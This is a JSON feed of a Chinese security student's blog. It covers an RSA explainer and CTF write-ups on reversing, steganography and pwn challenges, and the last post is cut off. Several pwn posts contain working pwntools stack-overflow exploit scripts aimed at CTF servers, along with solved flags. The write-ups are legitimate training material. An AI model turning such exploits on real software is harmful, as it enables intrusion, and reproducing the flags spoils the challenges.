{
    "version": "https://jsonfeed.org/version/1",
    "title": "Galaxy Knight",
    "subtitle": "工贼是没有好果汁吃的",
    "icon": "http://kyrita.top/images/favicon.ico",
    "description": "以后找不到工作可怎么办呀",
    "home_page_url": "http://kyrita.top",
    "items": [
        {
            "id": "http://kyrita.top/RSA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E8%AF%A6%E7%BB%86%E8%A7%A3%E8%AF%B4/",
            "url": "http://kyrita.top/RSA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E8%AF%A6%E7%BB%86%E8%A7%A3%E8%AF%B4/",
            "title": "RSA加密算法详细解说",
            "date_published": "2021-02-08T08:04:48.652Z",
            "content_html": "<p>RSA 加密算法是一种非对称加密算法，加密由公钥，私钥，明文，密文四部分组成.<br />\n<a id=\"more\"></a></p>\n<h2 id=\"取模运算\"><a class=\"anchor\" href=\"#取模运算\">#</a> 取模运算</h2>\n<p>a mod n ≡ b 表示 a 与 b 对模 n 同余 (a,b 分别除以 n)</p>\n<div class=\"note info\">\n<p>举个栗子: 3 mod 2 ≡ 1 &lt;--&gt; 1mod2=1 且 3mod2=1</p>\n</div>\n<h2 id=\"欧拉函数\"><a class=\"anchor\" href=\"#欧拉函数\">#</a> 欧拉函数</h2>\n<p>任意给定正整数 n，计算在小于等于 n 的正整数之中，有多少个与 n 构成互质关系？计算这个值的方法就叫做欧拉函数，以 φ(n) 表示.</p>\n<div class=\"note info\">\n<p>例如，在 1 到 8 之中，与 8 形成互质关系的是 1、3、5、7，所以 φ(n)=4</p>\n</div>\n<h3 id=\"在rsa算法中欧拉函数对以下定理成立\"><a class=\"anchor\" href=\"#在rsa算法中欧拉函数对以下定理成立\">#</a> 在 RSA 算法中，欧拉函数对以下定理成立</h3>\n<p>1. 如果 n 可以分解成两个互质的整数之积，即 n=p×q，则有：φ(n)=φ(pq)=φ( p )φ( q );<br />\n2. 当 p 为质数，φ(p)=p-1</p>\n<p>所以有 φ(n)=(p-1)(q-1)</p>\n<h2 id=\"欧拉定理与模反元素\"><a class=\"anchor\" href=\"#欧拉定理与模反元素\">#</a> 欧拉定理与模反元素</h2>\n<p>欧拉函数的用处，在于欧拉定理<br />\n “欧拉定理” 指的是:<br />\n 如果两个正整数 a 和 n 互质，则 n 的欧拉函数 φ(n) 可以让下面的等式成立：<br />\na^φ(n)≡1(modn)<br />\n 也就是说，a 的 φ(n) 次方被 n 除的余数为 1</p>\n<h3 id=\"模反元素的推导过程如下\"><a class=\"anchor\" href=\"#模反元素的推导过程如下\">#</a> 模反元素的推导过程如下:</h3>\n<p>根据欧拉定理，有：<br />\na^φ(n) = a × a^(φ(n)−1)≡1(modn)</p>\n<p>令 b=a^(φ(n)−1)，得：</p>\n<p>ab≡1(modn)</p>\n<div class=\"note info\">\n<p>b 就是 a 的模反元素<br />\n所以，如果两个正整数 a 和 n 互质，那么一定可以找到整数 b 使得 ab-1 被 n 整除，或者说 ab 被 n 除的余数是 1</p>\n</div>\n<p><span class=\"green\">所以求私钥 d 的公式：d*e≡1mod [(p-1)(q-1)]</span></p>\n<p>代入 φ(n) = (p-1)(q-1),φ(n) 与 e 互质，k 为正整数<br />\n可化为：d= (k*φ(n)+1)/e</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>公钥    n -->  两素数p、q之积</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        e -->  1&lt;e<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>(p-1)·(q-1)且e与乘积互质</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token attr-name\">私钥</span>    <span class=\"token attr-name\">d</span> <span class=\"token attr-name\">--</span><span class=\"token punctuation\">></span></span>  d·e ≡ 1 mod[(p-1)·(q-1)]</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        n -->  同公钥n</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>加密    ----->  C ≡ M^e mod(n)   M为明文</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>解密    ----->  M ≡ C^d mod(n)   C为密文</pre></td></tr></table></figure><h2 id=\"由pqdpdqc求明文的算法\"><a class=\"anchor\" href=\"#由pqdpdqc求明文的算法\">#</a> 由 p,q,dp,dq,c 求明文的算法</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>I <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>mp <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>dp<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>mq <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>dq<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span>               <span class=\"token comment\">#求幂取模运算</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>mp<span class=\"token operator\">-</span>mq<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>I<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>p<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>q<span class=\"token operator\">+</span>mq       <span class=\"token comment\">#求明文公式</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>          <span class=\"token comment\">#转为十六进制</span></pre></td></tr></table></figure><p>== pow (a,b,c) 表示 a^b% c 即 a^b mod c ==</p>\n<h3 id=\"数学运算规律\"><a class=\"anchor\" href=\"#数学运算规律\">#</a> 数学运算规律</h3>\n<p>a^b%p = ((a%p)^b)%p<br />\n 若 a≡b (% p), 则对任意的 c, 都有 (a+c)≡(b+c)(% p)<br />\n 若 a≡b (% p), 则对任意的 c, 都有 (a<em>c)≡(b</em>c)(%p)<br />\n 若 a≡b (% p), 对任意的 c, 都有 c≡d (% p), 那么 (a+c)≡(b+d)(% p),(a<em>c)≡(b</em>d)(%p)</p>\n<p>运算推论：参考 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pa2Vjb2tlL2FydGljbGUvZGV0YWlscy8xMDU5Njc4MDk/dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLWJhaWR1anNfdGl0bGUtMiZhbXA7c3BtPTEwMDEuMjEwMS4zMDAxLjQyNDI=\">https://blog.csdn.net/mikecoke/article/details/105967809?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-2&amp;spm=1001.2101.3001.4242</span></p>\n<p><img data-src=\"https://ftp.bmp.ovh/imgs/2021/02/6477b861b60b9672.png\" alt=\"\" /></p>\n<p><img data-src=\"https://ftp.bmp.ovh/imgs/2021/02/2488b83b697b9b94.png\" alt=\"\" /></p>\n",
            "tags": [
                "wiki",
                "crypto"
            ]
        },
        {
            "id": "http://kyrita.top/XOR/",
            "url": "http://kyrita.top/XOR/",
            "title": "XOR",
            "date_published": "2021-01-28T02:52:10.605Z",
            "content_html": "<p>关于 python xor 的脚本<br />\n<a id=\"more\"></a></p>\n<h2 id=\"ida打开看看\"><a class=\"anchor\" href=\"#ida打开看看\">#</a> IDA 打开看看</h2>\n<p>找到 main 函数，我们看到有异或字符，和 global 比较，相同的话就获得 flag</p>\n<p><img data-src=\"https://ftp.bmp.ovh/imgs/2021/01/f878bebf3c3e1066.png\" alt=\"\" /></p>\n<p><span class=\"purple\">第 9 行得知 flag 的长度为 33</span></p>\n<p><span class=\"red\">第 13 行比较 v6 和 global 处存放的前 31 位字符是否相同；相同则输出 success</span></p>\n<p><span class=\"rainbow\">从 main 函数里面可以得到 V6 的处理方式为 v6 [i] 等于 v6 [i] 原来的值与 v6 [i-1] 按位异或.</span></p>\n<h2 id=\"查看global字符串\"><a class=\"anchor\" href=\"#查看global字符串\">#</a> 查看 global 字符串</h2>\n<p><img data-src=\"https://ftp.bmp.ovh/imgs/2021/01/827aed457e7cd92a.png\" alt=\"\" /></p>\n<h2 id=\"编写解密脚本\"><a class=\"anchor\" href=\"#编写解密脚本\">#</a> 编写解密脚本</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>s <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'f'</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token string\">'k'</span><span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span><span class=\"token string\">'w&amp;O.@'</span><span class=\"token punctuation\">,</span><span class=\"token number\">17</span><span class=\"token punctuation\">,</span><span class=\"token string\">'x'</span><span class=\"token punctuation\">,</span><span class=\"token number\">13</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Z;U'</span><span class=\"token punctuation\">,</span><span class=\"token number\">17</span><span class=\"token punctuation\">,</span><span class=\"token string\">'p'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25</span><span class=\"token punctuation\">,</span><span class=\"token string\">'F'</span><span class=\"token punctuation\">,</span><span class=\"token number\">31</span><span class=\"token punctuation\">,</span><span class=\"token string\">'v\"M#D'</span><span class=\"token punctuation\">,</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span><span class=\"token string\">'g'</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token string\">'h'</span><span class=\"token punctuation\">,</span><span class=\"token number\">15</span><span class=\"token punctuation\">,</span><span class=\"token string\">'G2O'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>ss <span class=\"token operator\">=</span> <span class=\"token string\">'fkw&amp;O.@xZ;UpFv\"M#DghG2O'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>x <span class=\"token operator\">=</span> <span class=\"token string\">\"f\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">102</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">107</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">119</span><span class=\"token punctuation\">,</span> <span class=\"token number\">38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">59</span><span class=\"token punctuation\">,</span> <span class=\"token number\">85</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">112</span><span class=\"token punctuation\">,</span> <span class=\"token number\">25</span><span class=\"token punctuation\">,</span> <span class=\"token number\">70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">118</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34</span><span class=\"token punctuation\">,</span> <span class=\"token number\">77</span><span class=\"token punctuation\">,</span> <span class=\"token number\">35</span><span class=\"token punctuation\">,</span> <span class=\"token number\">68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">103</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">104</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">71</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">79</span> <span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\">#字符串转换成 10 进制</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tx <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">^</span>a<span class=\"token punctuation\">[</span>i<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#对应 v6</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p class=\"bulr\">拿到 flag：!<span class=\"spoiler\" title=\"快走开(╯▔皿▔)╯\">flag{QianQiuWanDai_YiTongJiangHu}</span>!</p>\n<h3 id=\"参考\"><a class=\"anchor\" href=\"#参考\">#</a> 参考</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9weXRob24vcHl0aG9uLW9wZXJhdG9ycy5odG1s\">https://www.runoob.com/python/python-operators.html</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDczMTEwMC9hcnRpY2xlL2RldGFpbHMvODkxNTYxNDE=\">https://blog.csdn.net/weixin_44731100/article/details/89156141</span></p>\n",
            "tags": [
                "wp",
                "Re"
            ]
        },
        {
            "id": "http://kyrita.top/Rip%E8%A6%86%E7%9B%96/",
            "url": "http://kyrita.top/Rip%E8%A6%86%E7%9B%96/",
            "title": "Rip覆盖",
            "date_published": "2021-01-27T11:07:12.924Z",
            "content_html": "<p>实属栈溢出.<br />\n<a id=\"more\"></a><br />\n<img data-src=\"https://i.loli.net/2021/01/27/LsrJ4dpjkzXOnQl.png\" alt=\"\" /></p>\n<h2 id=\"启动ida\"><a class=\"anchor\" href=\"#启动ida\">#</a> 启动 IDA</h2>\n<p><img data-src=\"https://i.loli.net/2021/01/27/6YANSFgolme5ZDB.png\" alt=\"\" /></p>\n<p>这个 gets 没有限制输入，存在栈溢出漏洞.</p>\n<p><img data-src=\"https://i.loli.net/2021/01/27/MtCuZR9sfJaQdoV.png\" alt=\"\" /></p>\n<p>需要我们输入来获取 flag;</p>\n<p>在 main 函数下还有一个 fun 函数；我们可以点开看看看</p>\n<p><img data-src=\"https://i.loli.net/2021/01/27/TatPnLBF3CpOQsi.png\" alt=\"\" /></p>\n<p>是一个系统调用且 start at 401186 (待会 payload 可以用到)</p>\n<p>双击 s 来到 stack of main 视图，这里了解了我们只需存入 15 个字节即可劫持函数返回地址<br />\n<img data-src=\"https://ftp.bmp.ovh/imgs/2021/01/e6e423001264fe86.png\" alt=\"\" /></p>\n<p>IDA 方面进行的差不多了，下面可以开始着手写脚本了</p>\n<h2 id=\"构造exp\"><a class=\"anchor\" href=\"#构造exp\">#</a> 构造 exp</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>h<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node3.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27829</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">15</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x401186</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>h<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>h<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"执行\"><a class=\"anchor\" href=\"#执行\">#</a> 执行</h2>\n<p><img data-src=\"https://ftp.bmp.ovh/imgs/2021/01/3b7387aaa01d232f.png\" alt=\"\" /></p>\n<p>刚开始还不知道要干什么，以为又是脚本写错了，后来才发觉是要执行 cat /flag 命令</p>\n<p><img data-src=\"https://ftp.bmp.ovh/imgs/2021/01/ff3701318adda06f.png\" alt=\"\" /></p>\n<p class=\"bulr\">get !<span class=\"spoiler\" title=\"快走开(╯▔皿▔)╯\">flag{8bf972eb-867d-485b-94d5-737f5bc12947}</span>!</p>\n",
            "tags": [
                "wp",
                "pwn"
            ]
        },
        {
            "id": "http://kyrita.top/ciscn-2019-n-1/",
            "url": "http://kyrita.top/ciscn-2019-n-1/",
            "title": "ciscn_2019_n_1",
            "date_published": "2021-01-27T09:54:57.711Z",
            "content_html": "<p>可能是栈溢出吗<br />\n<a id=\"more\"></a></p>\n<h2 id=\"先放出pwn的checksec\"><a class=\"anchor\" href=\"#先放出pwn的checksec\">#</a> 先放出 pwn 的 checksec</h2>\n<p><img data-src=\"https://i.loli.net/2021/01/27/nB356Ro1mZPaT7K.png\" alt=\"\" /></p>\n<p>64 位且栈堆不可执行</p>\n<h2 id=\"ida打开\"><a class=\"anchor\" href=\"#ida打开\">#</a> IDA 打开</h2>\n<p><img data-src=\"https://i.loli.net/2021/01/27/M7mdhurN319ifJo.png\" alt=\"\" /></p>\n<p>gets 是可以溢出的，但没必要；这一题我们只要覆盖到 v2, 然后让 v2==11.28125 就可以了.</p>\n<p>因此 gets 时先覆盖 b'a'*(0x30-0x04) 即可到 v2 的部分，再跟上 11.28125 的十六进制数即可成功获取 flag.</p>\n<p><img data-src=\"https://i.loli.net/2021/01/27/r457DUpQKStM23l.png\" alt=\"\" /></p>\n<p>通过在线转换我们获得 16 进制的浮点数.</p>\n<p>让我们开始 payload 吧.</p>\n<h2 id=\"构造exp如下\"><a class=\"anchor\" href=\"#构造exp如下\">#</a> 构造 exp 如下</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>h<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node3.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28466</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'A'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x41348000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>h<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>h<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>最后执行得到 flag<br />\n<img data-src=\"https://i.loli.net/2021/01/27/biPjdpe4F3ULZ5V.png\" alt=\"\" /></p>\n<p class=\"bulr\">!<span class=\"spoiler\" title=\"快走开(╯▔皿▔)╯\">flag{3220e461-4bf7-4910-8abc-19873d83291c}</span>!</p>\n<h3 id=\"贴一个在线进制转换\"><a class=\"anchor\" href=\"#贴一个在线进制转换\">#</a> 贴一个在线进制转换</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sb3N0cGhwLmNvbS9oZXhjb252ZXJ0Lw==\">CLICK ME</span></p>\n",
            "tags": [
                "wp",
                "pwn"
            ]
        },
        {
            "id": "http://kyrita.top/%E8%AF%B7%E9%97%AE%E5%A4%A7%E5%90%89%E6%9D%AF%E7%9A%84%E7%AD%BE%E5%88%B0%E6%98%AF%E5%9C%A8%E8%BF%99%E9%87%8C%E7%AD%BE%E5%90%97/",
            "url": "http://kyrita.top/%E8%AF%B7%E9%97%AE%E5%A4%A7%E5%90%89%E6%9D%AF%E7%9A%84%E7%AD%BE%E5%88%B0%E6%98%AF%E5%9C%A8%E8%BF%99%E9%87%8C%E7%AD%BE%E5%90%97/",
            "title": "请问大吉杯的签到是在这里签吗?",
            "date_published": "2021-01-27T02:16:08.102Z",
            "content_html": "<p>之前没接触过 zlib 文件格式；一直在思考如何将文件中的 zlib 解压，这一题整整忙了我两天.<br />\n 我是傻逼.<br />\n<a id=\"more\"></a></p>\n<h2 id=\"notepad查看\"><a class=\"anchor\" href=\"#notepad查看\">#</a> Notepad 查看</h2>\n<p>把下载下来的 png 用 Notepad 打开，发现里面还藏着一个 png.</p>\n<p><img data-src=\"https://i.loli.net/2021/01/27/VJ3P6ty4LqXoUCe.png\" alt=\"\" /></p>\n<h2 id=\"我们用binwalk分离一下\"><a class=\"anchor\" href=\"#我们用binwalk分离一下\">#</a> 我们用 binwalk 分离一下</h2>\n<p><img data-src=\"https://i.loli.net/2021/01/27/FoZMvwyrtHJ6QUD.png\" alt=\"\" /></p>\n<p><img data-src=\"https://i.loli.net/2021/01/27/tdCzyXp8U5wS4iB.png\" alt=\"\" /></p>\n<p>发现分离文件中有一张 png, 一张在 zip 里的 png，一份空白文档 (我以为有什么妙用，缩放 (并不是) 二维码什么的) 以及一份 zlib 文件；(接下来的几天里我一直在攻略这份 zlib)</p>\n<p><img data-src=\"https://i.loli.net/2021/01/27/NIRQDtWlx3kG2gU.png\" alt=\"\" /></p>\n<p>依据在此，我更加确信这是出错在 zlib. 于是在搜索引擎里不断地搜索关于 zlib 解压的方法 (我是傻逼)<br />\n···<br />\n···<br />\n后来，我才知道，有 zlib 说明大概率是 LSB 隐写；</p>\n<p>在此之前，我先把分离出的 4 张 png 都扫了一遍</p>\n<p><img data-src=\"https://i.loli.net/2021/01/27/qsa24LPozNOHSYI.jpg\" alt=\"\" /></p>\n<p><img data-src=\"https://i.loli.net/2021/01/27/nSgAQOD2icHZNMT.jpg\" alt=\"\" /></p>\n<p><img data-src=\"https://i.loli.net/2021/01/27/N13dXg7TDVlZiGJ.jpg\" alt=\"\" /></p>\n<p><img data-src=\"https://i.loli.net/2021/01/27/sbgj7Dx4zcPTWde.jpg\" alt=\"\" /></p>\n<p>可以清楚地知道，第二张图已经明确告诉我们扫到第二张就行了，error 就在 png2;</p>\n<p><img data-src=\"https://i.loli.net/2021/01/27/Z2lDuG6rELa35pF.png\" alt=\"\" /></p>\n<h2 id=\"放入stegsolve-记住此刻原图的形状我觉得倒像是一只兔子\"><a class=\"anchor\" href=\"#放入stegsolve-记住此刻原图的形状我觉得倒像是一只兔子\">#</a> 放入 stegsolve (记住此刻原图的形状，我觉得倒像是一只兔子)</h2>\n<p>然后我们查看最低位通道图</p>\n<p><img data-src=\"https://i.loli.net/2021/01/27/6kRHfnOJqivBZPc.png\" alt=\"\" /></p>\n<p>是的，没看错，二维码变了；但是还不可以扫喔.<br />\n 接下来我们需要将原图和这张二维码异或一下.</p>\n<p><img data-src=\"https://i.loli.net/2021/01/27/CADyL2eYNq9gc6n.png\" alt=\"\" /><br />\n不过我还找到另一个简便的出现方式<br />\n<img data-src=\"https://i.loli.net/2021/01/27/xhVcW7QvK415pIR.png\" alt=\"\" /><br />\n不约而同地，两张图都出现了神秘的符号；<br />\n 百度后了解了这是猪圈密码.<br />\n<img data-src=\"https://i.loli.net/2021/01/27/FznuCJQO48jq7Yd.png\" alt=\"\" /></p>\n<p>按照这个解密就好了；</p>\n<p class=\"bulr\">最后得到 flag:!<span class=\"spoiler\" title=\"快走开(╯▔皿▔)╯\">flag{dajiadoaidjb}</span>!</p>\n<p>还是挺简单的，但是之前没接触过 zlib,stegsolve 用得也不熟练，还得做加把劲骑士呢</p>\n",
            "tags": [
                "wp",
                "misc"
            ]
        },
        {
            "id": "http://kyrita.top/HASH%E7%A0%B4%E8%A7%A3/",
            "url": "http://kyrita.top/HASH%E7%A0%B4%E8%A7%A3/",
            "title": "HASH破解",
            "date_published": "2021-01-26T05:25:40.419Z",
            "content_html": "<p>待写<br />\n<a id=\"more\"></a><br />\n 简单论述 windows hash 破解</p>\n",
            "tags": [
                "wiki",
                "crypto"
            ]
        },
        {
            "id": "http://kyrita.top/pwn/",
            "url": "http://kyrita.top/pwn/",
            "title": "砰！",
            "date_published": "2021-01-26T04:07:07.903Z",
            "content_html": "<p>放假在家准备接触一下从未挑战过的 pwn<br />\n<a id=\"more\"></a></p>\n<h1 id=\"pwn1_sctf_2016\"><a class=\"anchor\" href=\"#pwn1_sctf_2016\">#</a> pwn1_sctf_2016</h1>\n<h2 id=\"download文件后checksec\"><a class=\"anchor\" href=\"#download文件后checksec\">#</a> Download 文件后 checksec</h2>\n<p><img data-src=\"https://i.loli.net/2021/01/26/7j8JaB9lHnkAOEz.png\" alt=\"\" /></p>\n<p>地址在哪已经显而易见了，接着我们 IDA 静态分析一下；</p>\n<h2 id=\"找到漏洞函数\"><a class=\"anchor\" href=\"#找到漏洞函数\">#</a> 找到漏洞函数</h2>\n<p><img data-src=\"https://i.loli.net/2021/01/26/bWcCqv3JaAkjKLM.png\" alt=\"\" /></p>\n<p>s 的长度为 60, 而我们只能够输入 32 个字符，不足以栈溢出；<br />\n 但是 replace 函数会把我们输入的 I 替换成 you,I 是一个字符，you 是三个字符，这样输入 20 个 I 既不会超过 32 字符限制，最终替换成 60 个字符也能够填满 s.</p>\n<h3 id=\"找到后门函数08048f0d\"><a class=\"anchor\" href=\"#找到后门函数08048f0d\">#</a> 找到后门函数：08048F0D</h3>\n<p><img data-src=\"https://i.loli.net/2021/01/26/IFjYROyJEVHSNhx.png\" alt=\"\" /></p>\n<div class=\"note info\">\n<p>exp:</p>\n</div>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node3.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">27833</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'I'</span><span class=\"token operator\">*</span><span class=\"token number\">20</span><span class=\"token operator\">+</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">4</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x08048F0D</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>执行结果:</p>\n<p><img data-src=\"https://i.loli.net/2021/01/26/Udh2q8TIw3DECvR.png\" alt=\"\" /></p>\n<p class=\"bulr\">拿到 flag:<br />\n!<span class=\"spoiler\" title=\"快走开(╯▔皿▔)╯\">flag{5e9a24f6-ddb2-4237-b3e0-6d968c34cec8}</span>!</p>\n<h1 id=\"warmup_csaw_2016\"><a class=\"anchor\" href=\"#warmup_csaw_2016\">#</a> warmup_csaw_2016</h1>\n<p>拖入 IDA F5</p>\n<p><img data-src=\"https://i.loli.net/2021/01/26/yY1db59ZflEcagC.png\" alt=\"\" /></p>\n<p>发现要求输入 v5 自变量；</p>\n<p><img 